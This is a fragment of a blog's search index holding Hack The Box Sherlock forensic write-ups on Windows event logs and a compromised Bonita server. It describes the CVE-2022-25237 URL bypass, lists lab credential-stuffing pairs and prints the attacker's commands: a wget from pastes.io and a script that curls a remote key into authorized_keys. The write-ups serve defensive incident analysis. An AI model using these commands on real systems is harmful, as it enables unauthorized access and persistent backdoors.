\u0026#34;cyberjunkie\u0026#34;, \u0026#34;subjectusersid\u0026#34;: \u0026#34;s-1-5-21-3393683511-3463148672-371912004-1001\u0026#34;, \u0026#34;taskcontent\u0026#34;: \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;utf-16\\\u0026#34;?\u0026gt;\\r\\n\u0026lt;task version=\\\u0026#34;1.2\\\u0026#34; xmlns=\\\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\\\u0026#34;\u0026gt;\\r\\n \u0026lt;registrationinfo\u0026gt;\\r\\n \u0026lt;date\u0026gt;2023-03-27t07:51:21.4599985\u0026lt;/date\u0026gt;\\r\\n \u0026lt;author\u0026gt;desktop-887gk2l\\\\cyberjunkie\u0026lt;/author\u0026gt;\\r\\n \u0026lt;description\u0026gt;practice\u0026lt;/description\u0026gt;\\r\\n \u0026lt;uri\u0026gt;\\\\htb-automation\u0026lt;/uri\u0026gt;\\r\\n \u0026lt;/registrationinfo\u0026gt;\\r\\n \u0026lt;triggers\u0026gt;\\r\\n \u0026lt;calendartrigger\u0026gt;\\r\\n \u0026lt;startboundary\u0026gt;2023-03-27t09:00:00\u0026lt;/startboundary\u0026gt;\\r\\n \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt;\\r\\n \u0026lt;schedulebyday\u0026gt;\\r\\n \u0026lt;daysinterval\u0026gt;1\u0026lt;/daysinterval\u0026gt;\\r\\n \u0026lt;/schedulebyday\u0026gt;\\r\\n \u0026lt;/calendartrigger\u0026gt;\\r\\n \u0026lt;/triggers\u0026gt;\\r\\n \u0026lt;principals\u0026gt;\\r\\n \u0026lt;principal id=\\\u0026#34;author\\\u0026#34;\u0026gt;\\r\\n \u0026lt;runlevel\u0026gt;leastprivilege\u0026lt;/runlevel\u0026gt;\\r\\n \u0026lt;userid\u0026gt;desktop-887gk2l\\\\cyberjunkie\u0026lt;/userid\u0026gt;\\r\\n \u0026lt;logontype\u0026gt;interactivetoken\u0026lt;/logontype\u0026gt;\\r\\n \u0026lt;/principal\u0026gt;\\r\\n \u0026lt;/principals\u0026gt;\\r\\n \u0026lt;settings\u0026gt;\\r\\n \u0026lt;multipleinstancespolicy\u0026gt;ignorenew\u0026lt;/multipleinstancespolicy\u0026gt;\\r\\n \u0026lt;disallowstartifonbatteries\u0026gt;true\u0026lt;/disallowstartifonbatteries\u0026gt;\\r\\n \u0026lt;stopifgoingonbatteries\u0026gt;true\u0026lt;/stopifgoingonbatteries\u0026gt;\\r\\n \u0026lt;allowhardterminate\u0026gt;true\u0026lt;/allowhardterminate\u0026gt;\\r\\n \u0026lt;startwhenavailable\u0026gt;false\u0026lt;/startwhenavailable\u0026gt;\\r\\n \u0026lt;runonlyifnetworkavailable\u0026gt;false\u0026lt;/runonlyifnetworkavailable\u0026gt;\\r\\n \u0026lt;idlesettings\u0026gt;\\r\\n \u0026lt;duration\u0026gt;pt10m\u0026lt;/duration\u0026gt;\\r\\n \u0026lt;waittimeout\u0026gt;pt1h\u0026lt;/waittimeout\u0026gt;\\r\\n \u0026lt;stoponidleend\u0026gt;true\u0026lt;/stoponidleend\u0026gt;\\r\\n \u0026lt;restartonidle\u0026gt;false\u0026lt;/restartonidle\u0026gt;\\r\\n \u0026lt;/idlesettings\u0026gt;\\r\\n \u0026lt;allowstartondemand\u0026gt;true\u0026lt;/allowstartondemand\u0026gt;\\r\\n \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt;\\r\\n \u0026lt;hidden\u0026gt;false\u0026lt;/hidden\u0026gt;\\r\\n \u0026lt;runonlyifidle\u0026gt;false\u0026lt;/runonlyifidle\u0026gt;\\r\\n \u0026lt;waketorun\u0026gt;false\u0026lt;/waketorun\u0026gt;\\r\\n \u0026lt;executiontimelimit\u0026gt;p3d\u0026lt;/executiontimelimit\u0026gt;\\r\\n \u0026lt;priority\u0026gt;7\u0026lt;/priority\u0026gt;\\r\\n \u0026lt;/settings\u0026gt;\\r\\n \u0026lt;actions context=\\\u0026#34;author\\\u0026#34;\u0026gt;\\r\\n \u0026lt;exec\u0026gt;\\r\\n \u0026lt;command\u0026gt;c:\\\\users\\\\cyberjunkie\\\\desktop\\\\automation-htb.ps1\u0026lt;/command\u0026gt;\\r\\n \u0026lt;arguments\u0026gt;-a cyberjunkie@hackthebox.eu\u0026lt;/arguments\u0026gt;\\r\\n \u0026lt;/exec\u0026gt;\\r\\n \u0026lt;/actions\u0026gt;\\r\\n\u0026lt;/task\u0026gt;\u0026#34;, \u0026#34;taskname\u0026#34;: \u0026#34;\\\\htb-automation\u0026#34; }, \u0026#34;system\u0026#34;: { \u0026#34;channel\u0026#34;: \u0026#34;security\u0026#34;, \u0026#34;computer\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;correlation\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;activityid\u0026#34;: \u0026#34;986a053f-60b9-0002-5b05-6a98b960d901\u0026#34; } }, \u0026#34;eventid\u0026#34;: 4698, \u0026#34;eventrecordid\u0026#34;: 13103, \u0026#34;execution\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;processid\u0026#34;: 780, \u0026#34;threadid\u0026#34;: 4180 } }, \u0026#34;keywords\u0026#34;: \u0026#34;0x8020000000000000\u0026#34;, \u0026#34;level\u0026#34;: 0, \u0026#34;opcode\u0026#34;: 0, \u0026#34;provider\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;guid\u0026#34;: \u0026#34;54849625-5478-4994-a5ba-3e3b0328c30d\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;microsoft-windows-security-auditing\u0026#34; } }, \u0026#34;security\u0026#34;: null, \u0026#34;task\u0026#34;: 12804, \u0026#34;timecreated\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;systemtime\u0026#34;: \u0026#34;2023-03-27t14:51:21.481720z\u0026#34; } }, \u0026#34;version\u0026#34;: 1 } } } task name was \u0026ldquo;htb-automation\u0026rdquo; and the contents were:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-16\u0026#34;?\u0026gt; \u0026lt;task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;registrationinfo\u0026gt; \u0026lt;date\u0026gt;2023-03-27t07:51:21.4599985\u0026lt;/date\u0026gt; \u0026lt;author\u0026gt;desktop-887gk2l\\\\cyberjunkie\u0026lt;/author\u0026gt; \u0026lt;description\u0026gt;practice\u0026lt;/description\u0026gt; \u0026lt;uri\u0026gt;\\\\htb-automation\u0026lt;/uri\u0026gt; \u0026lt;/registrationinfo\u0026gt; \u0026lt;triggers\u0026gt; \u0026lt;calendartrigger\u0026gt; \u0026lt;startboundary\u0026gt;2023-03-27t09:00:00\u0026lt;/startboundary\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;schedulebyday\u0026gt; \u0026lt;daysinterval\u0026gt;1\u0026lt;/daysinterval\u0026gt; \u0026lt;/schedulebyday\u0026gt; \u0026lt;/calendartrigger\u0026gt; \u0026lt;/triggers\u0026gt; \u0026lt;principals\u0026gt; \u0026lt;principal id=\u0026#34;author\u0026#34;\u0026gt; \u0026lt;runlevel\u0026gt;leastprivilege\u0026lt;/runlevel\u0026gt; \u0026lt;userid\u0026gt;desktop-887gk2l\\\\cyberjunkie\u0026lt;/userid\u0026gt; \u0026lt;logontype\u0026gt;interactivetoken\u0026lt;/logontype\u0026gt; \u0026lt;/principal\u0026gt; \u0026lt;/principals\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;multipleinstancespolicy\u0026gt;ignorenew\u0026lt;/multipleinstancespolicy\u0026gt; \u0026lt;disallowstartifonbatteries\u0026gt;true\u0026lt;/disallowstartifonbatteries\u0026gt; \u0026lt;stopifgoingonbatteries\u0026gt;true\u0026lt;/stopifgoingonbatteries\u0026gt; \u0026lt;allowhardterminate\u0026gt;true\u0026lt;/allowhardterminate\u0026gt; \u0026lt;startwhenavailable\u0026gt;false\u0026lt;/startwhenavailable\u0026gt; \u0026lt;runonlyifnetworkavailable\u0026gt;false\u0026lt;/runonlyifnetworkavailable\u0026gt; \u0026lt;idlesettings\u0026gt; \u0026lt;duration\u0026gt;pt10m\u0026lt;/duration\u0026gt; \u0026lt;waittimeout\u0026gt;pt1h\u0026lt;/waittimeout\u0026gt; \u0026lt;stoponidleend\u0026gt;true\u0026lt;/stoponidleend\u0026gt; \u0026lt;restartonidle\u0026gt;false\u0026lt;/restartonidle\u0026gt; \u0026lt;/idlesettings\u0026gt; \u0026lt;allowstartondemand\u0026gt;true\u0026lt;/allowstartondemand\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;hidden\u0026gt;false\u0026lt;/hidden\u0026gt; \u0026lt;runonlyifidle\u0026gt;false\u0026lt;/runonlyifidle\u0026gt; \u0026lt;waketorun\u0026gt;false\u0026lt;/waketorun\u0026gt; \u0026lt;executiontimelimit\u0026gt;p3d\u0026lt;/executiontimelimit\u0026gt; \u0026lt;priority\u0026gt;7\u0026lt;/priority\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;actions context=\u0026#34;author\u0026#34;\u0026gt; \u0026lt;exec\u0026gt; \u0026lt;command\u0026gt;c:\\\\users\\\\cyberjunkie\\\\desktop\\\\automation-htb.ps1\u0026lt;/command\u0026gt; \u0026lt;arguments\u0026gt;-a cyberjunkie@hackthebox.eu\u0026lt;/arguments\u0026gt; \u0026lt;/exec\u0026gt; \u0026lt;/actions\u0026gt; \u0026lt;/task\u0026gt; windows defend antivirus threat detection event id is 1117. to list these events invoked by the use cyberjunkie we can use the following command:\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==1117 and .event.eventdata.\u0026#34;detection user\u0026#34;==\u0026#34;desktop-887gk2l\\\\cyberjunkie\u0026#34;)\u0026#39; -c | tail -n1 { \u0026#34;event\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://schemas.microsoft.com/win/2004/08/events/event\u0026#34; }, \u0026#34;eventdata\u0026#34;: { \u0026#34;action id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;action name\u0026#34;: \u0026#34;quarantine\u0026#34;, \u0026#34;additional actions id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;additional actions string\u0026#34;: \u0026#34;no additional actions required\u0026#34;, \u0026#34;category id\u0026#34;: \u0026#34;34\u0026#34;, \u0026#34;category name\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;detection id\u0026#34;: \u0026#34;{0ebc4bea-5532-4efb-8a34-64f91cc8702e}\u0026#34;, \u0026#34;detection time\u0026#34;: \u0026#34;2023-03-27t14:42:34.272z\u0026#34;, \u0026#34;detection user\u0026#34;: \u0026#34;desktop-887gk2l\\\\cyberjunkie\u0026#34;, \u0026#34;engine version\u0026#34;: \u0026#34;am: 1.1.20100.6, nis: 1.1.20100.6\u0026#34;, \u0026#34;error code\u0026#34;: \u0026#34;0x80508023\u0026#34;, \u0026#34;error description\u0026#34;: \u0026#34;the program could not find the malware and other potentially unwanted software on this device. \u0026#34;, \u0026#34;execution id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;execution name\u0026#34;: \u0026#34;unknown\u0026#34;, \u0026#34;fwlink\u0026#34;: \u0026#34;https://go.microsoft.com/fwlink/?linkid=37020\u0026amp;name=hacktool:msil/sharphound!msr\u0026amp;threatid=2147814944\u0026amp;enterprise=0\u0026#34;, \u0026#34;origin id\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;origin name\u0026#34;: \u0026#34;internet\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;containerfile:_c:\\\\users\\\\cyberjunkie\\\\downloads\\\\sharphound-v1.1.0.zip; file:_c:\\\\users\\\\cyberjunkie\\\\downloads\\\\sharphound-v1.1.0.zip-\u0026gt;sharphound.exe; webfile:_c:\\\\users\\\\cyberjunkie\\\\downloads\\\\sharphound-v1.1.0.zip|https://objects.githubusercontent.com/github-production-release-asset-2e65be/385323486/70d776cc-8f83-44d5-b226-2dccc4f7c1e3?x-amz-algorithm=aws4-hmac-sha256\u0026amp;x-amz-credential=akiaiwnjyax4csveh53a%2f20230327%2fus-east-1%2fs3%2faws4_request\u0026amp;x-amz-date=20230327t144228z\u0026amp;x-amz-expires=300\u0026amp;x-amz-signature=f969ef5ca3eec150dc1e23623434adc1e4a444ba026423c32edf5e85d881a771\u0026amp;x-amz-signedheaders=host\u0026amp;actor_id=0\u0026amp;key_id=0\u0026amp;repo_id=385323486\u0026amp;response-content-disposition=attachment%3b%20filename%3dsharphound-v1.1.0.zip\u0026amp;response-content-type=application%2foctet-stream|pid:3532,processstart:133244017530289775\u0026#34;, \u0026#34;post clean status\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;pre execution status\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;process name\u0026#34;: \u0026#34;unknown\u0026#34;, \u0026#34;product name\u0026#34;: \u0026#34;microsoft defender antivirus\u0026#34;, \u0026#34;product version\u0026#34;: \u0026#34;4.18.2302.7\u0026#34;, \u0026#34;remediation user\u0026#34;: \u0026#34;nt authority\\\\system\u0026#34;, \u0026#34;security intelligence version\u0026#34;: \u0026#34;av: 1.385.1261.0, as: 1.385.1261.0, nis: 1.385.1261.0\u0026#34;, \u0026#34;severity id\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;severity name\u0026#34;: \u0026#34;high\u0026#34;, \u0026#34;source id\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;source name\u0026#34;: \u0026#34;downloads and attachments\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;status code\u0026#34;: \u0026#34;103\u0026#34;, \u0026#34;status description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;threat id\u0026#34;: \u0026#34;2147814944\u0026#34;, \u0026#34;threat name\u0026#34;: \u0026#34;hacktool:msil/sharphound!msr\u0026#34;, \u0026#34;type id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;type name\u0026#34;: \u0026#34;concrete\u0026#34;, \u0026#34;unused\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;unused2\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;unused3\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;unused4\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;unused5\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;unused6\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;system\u0026#34;: { \u0026#34;channel\u0026#34;: \u0026#34;microsoft-windows-windows defender/operational\u0026#34;, \u0026#34;computer\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;correlation\u0026#34;: null, \u0026#34;eventid\u0026#34;: 1117, \u0026#34;eventrecordid\u0026#34;: 444, \u0026#34;execution\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;processid\u0026#34;: 3300, \u0026#34;threadid\u0026#34;: 3056 } }, \u0026#34;keywords\u0026#34;: \u0026#34;0x8000000000000000\u0026#34;, \u0026#34;level\u0026#34;: 4, \u0026#34;opcode\u0026#34;: 0, \u0026#34;provider\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;guid\u0026#34;: \u0026#34;11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;microsoft-windows-windows defender\u0026#34; } }, \u0026#34;security\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;userid\u0026#34;: \u0026#34;s-1-5-18\u0026#34; } }, \u0026#34;task\u0026#34;: 0, \u0026#34;timecreated\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;systemtime\u0026#34;: \u0026#34;2023-03-27t14:42:48.353664z\u0026#34; } }, \u0026#34;version\u0026#34;: 0 } } } to list the commands executed on powershell by the user cyberjunkie we need two pieces of information.\nwe need the time when cyberjunkie user logged on to the system. we need the powershell script block execution event id which is 4104 correlating this two pieces of data we can extract the commands ran by the user cyberjunkie.\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==4104 and .event.system.timecreated.\u0026#34;#attributes\u0026#34;.systemtime \u0026gt; \u0026#34;2023-03-27t14:38:32.937458z\u0026#34;) .event.eventdata.scriptblocktext\u0026#39; \u0026#34;prompt\u0026#34; \u0026#34;get-filehash -algorithm md5 .\\\\desktop\\\\automation-htb.ps1\u0026#34; \u0026#34;prompt\u0026#34; use zimmerman\u0026#39;s evtxecmd.exe for future windows event log analysis. it flattens the json fields to almost 1 level deep, which can be very useful to query using **jq** finding the deleted system event log after cyberjunkie logged on to the system.\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==104 and .event.system.timecreated.\u0026#34;#attributes\u0026#34;.systemtime \u0026gt; \u0026#34;2023-03-27t14:38:32.937458z\u0026#34;)\u0026#39; { \u0026#34;event\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://schemas.microsoft.com/win/2004/08/events/event\u0026#34; }, \u0026#34;system\u0026#34;: { \u0026#34;channel\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;computer\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;correlation\u0026#34;: null, \u0026#34;eventid\u0026#34;: 104, \u0026#34;eventrecordid\u0026#34;: 2186, \u0026#34;execution\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;processid\u0026#34;: 1332, \u0026#34;threadid\u0026#34;: 5332 } }, \u0026#34;keywords\u0026#34;: \u0026#34;0x8000000000000000\u0026#34;, \u0026#34;level\u0026#34;: 4, \u0026#34;opcode\u0026#34;: 0, \u0026#34;provider\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;guid\u0026#34;: \u0026#34;{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;microsoft-windows-eventlog\u0026#34; } }, \u0026#34;security\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;userid\u0026#34;: \u0026#34;s-1-5-21-3393683511-3463148672-371912004-1001\u0026#34; } }, \u0026#34;task\u0026#34;: 104, \u0026#34;timecreated\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;systemtime\u0026#34;: \u0026#34;2023-03-27t15:01:56.515836z\u0026#34; } }, \u0026#34;version\u0026#34;: 0 }, \u0026#34;userdata\u0026#34;: { \u0026#34;logfilecleared\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://manifests.microsoft.com/win/2004/08/windows/eventlog\u0026#34; }, \u0026#34;backuppath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;channel\u0026#34;: \u0026#34;microsoft-windows-windows firewall with advanced security/firewall\u0026#34;, \u0026#34;subjectdomainname\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;subjectusername\u0026#34;: \u0026#34;cyberjunkie\u0026#34; } } } } summary this sherlock was tough for me to answer the task 11, 12 questions. i get to study different kinds of windows event logs specially firewall, powershell, windows defender and system. i get to analyze what commands the ta ran, what malicious files they uploaded, what firewall rules were added and also how they tried to cover their tracks by removing certain log files. it was a fun experience.\n","title":"HTB Sherlock Logjammer"},{"date":"2024-06-12","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/meerkat/","summary":"Meerkat - SOC Scenario As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren\u0026rsquo;t the most security aware. As our new security provider we\u0026rsquo;d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.","tags":["alerts","exploit","forensic","htb","jq","json","linux","pcap","sherlock","siem","soc","wireshark"],"text":"meerkat - soc scenario as a fast-growing startup, forela has been utilising a business management platform. unfortunately, our documentation is scarce, and our administrators aren\u0026rsquo;t the most security aware. as our new security provider we\u0026rsquo;d like you to have a look at some pcap and log data we have exported to confirm if we have (or have not) been compromised.\nartifacts artifact md5 hash password meerkat.zip 9b8369a0fcd7f95889c28da597951ad3 hacktheblue meerkat-alerts.json f9642326d526c4f5159470b1c5d89b4a n/a meerkat.pcap 7ac62b1e835e0850104f1fc2ecf1f002 n/a tools used jq json parser - analyzing the json file. wireshark - analyzing the pcap file. forensic analysis using jq i quickly searched for alerts with severity level 1.\n$ cat meerkat-alerts.json| jq \u0026#39;.[] | select(.alert.severity==1)\u0026#39; | less \u0026lt;--snip--\u0026gt; { \u0026#34;ts\u0026#34;: \u0026#34;2023-01-19t15:31:31.042z\u0026#34;, \u0026#34;event_type\u0026#34;: \u0026#34;alert\u0026#34;, \u0026#34;src_ip\u0026#34;: \u0026#34;156.146.62.213\u0026#34;, \u0026#34;src_port\u0026#34;: 53196, \u0026#34;dest_ip\u0026#34;: \u0026#34;172.31.6.44\u0026#34;, \u0026#34;dest_port\u0026#34;: 8080, \u0026#34;vlan\u0026#34;: null, \u0026#34;proto\u0026#34;: \u0026#34;tcp\u0026#34;, \u0026#34;app_proto\u0026#34;: \u0026#34;http\u0026#34;, \u0026#34;alert\u0026#34;: { \u0026#34;severity\u0026#34;: 1, \u0026#34;signature\u0026#34;: \u0026#34;et web_specific_apps bonitasoft default user login attempt m1 (possible staging for cve-2022-25237)\u0026#34;, \u0026#34;category\u0026#34;: \u0026#34;attempted administrator privilege gain\u0026#34;, \u0026#34;action\u0026#34;: \u0026#34;allowed\u0026#34;, \u0026#34;signature_id\u0026#34;: 2036815, \u0026#34;gid\u0026#34;: 1, \u0026#34;rev\u0026#34;: 1, \u0026#34;metadata\u0026#34;: { \u0026#34;signature_severity\u0026#34;: [ \u0026#34;minor\u0026#34; ], \u0026#34;former_category\u0026#34;: [ \u0026#34;web_specific_apps\u0026#34; ], \u0026#34;attack_target\u0026#34;: [ \u0026#34;server\u0026#34; ], \u0026#34;deployment\u0026#34;: [ \u0026#34;ssldecrypt\u0026#34;, \u0026#34;perimeter\u0026#34; ], \u0026#34;affected_product\u0026#34;: null, \u0026#34;created_at\u0026#34;: [ \u0026#34;2022_06_03\u0026#34; ], \u0026#34;performance_impact\u0026#34;: [ \u0026#34;low\u0026#34; ], \u0026#34;updated_at\u0026#34;: [ \u0026#34;2022_06_03\u0026#34; ], \u0026#34;malware_family\u0026#34;: null, \u0026#34;tag\u0026#34;: null, \u0026#34;cve\u0026#34;: [ \u0026#34;cve_2022_25237\u0026#34; ] } }, \u0026#34;flow_id\u0026#34;: 1652763046938834, \u0026#34;pcap_cnt\u0026#34;: 2168, \u0026#34;tx_id\u0026#34;: 0, \u0026#34;icmp_code\u0026#34;: null, \u0026#34;icmp_type\u0026#34;: null, \u0026#34;tunnel\u0026#34;: null, \u0026#34;community_id\u0026#34;: \u0026#34;1:0xawrtog1jdopmx+yd1wrdezmac=\u0026#34; } looks like a ta was brute forcing the default credentials for bonitasoft to exploit the cve-2022-25237. i confirmed the credential stuffing attack by analyzing the pcap file.\npcap analysis using wireshark analyzing the pcap file it was confirmed that the ta successfully gained access to an account with the credential seb.broom@forela.co.uk:g0vernm3nt. and then gained privileged access to the web application\u0026rsquo;s rest api by exploiting cve-2022-25237. after getting privileged access to the bonita web service the ta uploaded a malicious api extension to get command execution on the web application server. the ta successfully gained command execution on the server. cve-2022-25237 according to nist, bonita web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the restapiauthorizationfilter. by appending ;i18ntranslation or /../i18ntranslation/ to the end of a url, users with no privileges can access privileged api endpoints. this can lead to remote code execution by abusing the privileged api actions.\nhttp object extraction: after discovering this incident i extracted all the http tcp stream objects from the pcap file and found the usernames and passwords combination list used in this security incident.\nuser,password clerc.killich%40forela.co.uk,vydwovhgiwj lauren.pirozzi%40forela.co.uk,wsp0uy merna.rammell%40forela.co.uk,u7pwof36fn gianina.tampling%40forela.co.uk,mauiffqql konstance.domaschke%40forela.co.uk,6xlzjvd vida.murty%40forela.co.uk,4ulecg elka.cavet%40forela.co.uk,n1asdc noam.harvett%40forela.co.uk,vdt8bh norbie.bartolini%40forela.co.uk,gv2zlop cariotta.whife%40forela.co.uk,x3hou0 mella.amsberger%40forela.co.uk,4niym5wqn cyndy.element%40forela.co.uk,ybwxct imelda.braben%40forela.co.uk,dc7bjglyb marven.samuel%40forela.co.uk,lpu0qqnt108 osborne.humpatch%40forela.co.uk,oj4whci4d talya.sterman%40forela.co.uk,3gcerz2jmh drusilla.nice%40forela.co.uk,l35euh0t3am tobiah.horstead%40forela.co.uk,fp0oql kayley.northway%40forela.co.uk,s9mc7mkdvu adora.mersh%40forela.co.uk,85hh8jzkjr6 guss.botten%40forela.co.uk,svmrggmv0se cordelie.rostron%40forela.co.uk,matdcjh ellerey.bierling%40forela.co.uk,nva0nktz berny.ferrarin%40forela.co.uk,lpco6z nefen.heffernon%40forela.co.uk,vr0za8 skipton.pickerill%40forela.co.uk,lcsui1nu nola.crichmer%40forela.co.uk,qga58w3l sharon.claus%40forela.co.uk,3x4d06i bernelle.draycott%40forela.co.uk,mmxluawe0ow samaria.percifull%40forela.co.uk,cugc3hzhw5g puff.yapp%40forela.co.uk,m08aae cynthia.hatto%40forela.co.uk,z0nxi6 seb.broom%40forela.co.uk,g0vernm3nt alexi.siman%40forela.co.uk,ius11px pete.panons%40forela.co.uk,bkdkgtb rakel.cawley%40forela.co.uk,h4gw3ylwnw9t merl.lavalde%40forela.co.uk,bgfiovxnlbc antoinette.vittel%40forela.co.uk,bgthl8cg stanleigh.tuckwell%40forela.co.uk,vqck8tgn3 denny.gepson%40forela.co.uk,q2jqcsxk69 aline.rivallant%40forela.co.uk,gfixyf1nggf jordain.eykel%40forela.co.uk,rnmxbndnw0 gypsy.henric%40forela.co.uk,llpqvgmhs5f adrea.shervil%40forela.co.uk,7yofhtuq jenilee.pressman%40forela.co.uk,3eywlokhqecl fredrick.gerraty%40forela.co.uk,w1by0hubydho ebony.oleszcuk%40forela.co.uk,uawnyfkojqm garrard.colisbe%40forela.co.uk,jmi9ip farleigh.schouthede%40forela.co.uk,jzi6dvhy ahmed.monteaux%40forela.co.uk,6uskrtw8u griffith.lumm%40forela.co.uk,qpepd0m8wbk winston.conville%40forela.co.uk,cemh5w2vh pat.kloisner%40forela.co.uk,n8zwvmzf6 teresita.benford%40forela.co.uk,uvyjtqzx mathian.skidmore%40forela.co.uk,tqsnp6xrk gerri.cordy%40forela.co.uk,w15pvwgtk i also found an interesting file named bx5gcr0et8.\n{\u0026#34;p\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;c\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;cmd\u0026#34;:\u0026#34;wget https://pastes.io/raw/bx5gcr0et8\u0026#34;,\u0026#34;out\u0026#34;:\u0026#34;--2023-01-19 15:38:52-- https://pastes.io/raw/bx5gcr0et8\\nresolving pastes.io (pastes.io)... 66.29.132.145\\nconnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\\nhttp request sent, awaiting response... 200 ok\\nlength: 113 [text/plain]\\nsaving to: \\u2018bx5gcr0et8\\u2019\\n\\n 0k 100% 57.8m=0s\\n\\n2023-01-19 15:38:53 (57.8 mb/s) - \\u2018bx5gcr0et8\\u2019 saved [113/113]\\n\\n\u0026#34;,\u0026#34;currentdate\u0026#34;:\u0026#34;2023-01-19\u0026#34;} a command was issued to download the file from pastes.io. and then another command was issued to run the bx5gcr0et8 file which was a bash script. the contents of the bash script bx5gcr0et8:\n**#!/bin/bash curl https://pastes.io/raw/hffgra4unv \u0026gt;\u0026gt; /home/ubuntu/.ssh/authorized_keys sudo service ssh restart** a persistence technique identified by mitre with a technique id t1098.004. basically, the adversary used a public key and inserted in into the /home/ubuntu/.ssh/authorized_keys file. in this technique the ta can also set the derivative pubkeyauthentication set to yes in the /etc/ssh/sshd_config file. and, also can modify the sshd_config file further and set the rsaauthentication to the value yes, if the public key algorithm is rsa based.\nthe public key used by the ta:\nssh-rsa aaaab3nzac1yc2eaaaadaqabaaabaqcgrurmq3dmrogxrcpeeueqqq3is/sal3gryt+nuqbba/m+kg4elcvjs4gp2os1b8fmk3zwvrvtdpekw6wdgqpl2wxznbjobstx6of2yp9riob3c/ezgs9zvnao07yc8sm4nkkxhgkabqcm7rhey4lay0lwf9ubxuesahijgq2adbksnlg0gmnjtnrwkbqesk0zcg3b6icj6nkkykezblvwc7z4mksm28zvta15w3huwsewrbggj6embdi7wnwxz92sydq0xubv2sx2gjodghwcd6i0q9bu52wwyo3l3lapeotclua+hnn82086ouzjfmeutwglpaxfjbn7vrimsvsn summary the threat actors used credential stuffing attack against the bonita service and escalated their privileges in the web application by exploiting cve-2022-25237. after that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. then, they used this ability to get information of the users and added a ssh backdoor to the ubuntu user account for persistence.\n","title":"HTB Sherlock Meerkat"},{"date":"2024-06-11","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/rogueone/","summary":"RogueOne - DFIR Scenario Your SIEM system generated multiple alerts in less than a minute, indicating potential C2 communication from Simon Stark\u0026rsquo;s workstation. Despite Simon not noticing anything unusual, the IT team had him share screenshots of his task manager to check for any unusual processes.","tags":["dfir","dump","forensic","htb","malware","memory","sherlock","volatility","windows"],"text":"rogueone - dfir scenario your siem system generated multiple alerts in less than a minute, indicating potential c2 communication from simon stark\u0026rsquo;s workstation. despite simon not noticing anything unusual, the it team had him share screenshots of his task manager to check for any unusual processes. no suspicious processes were found, yet alerts about c2 communications 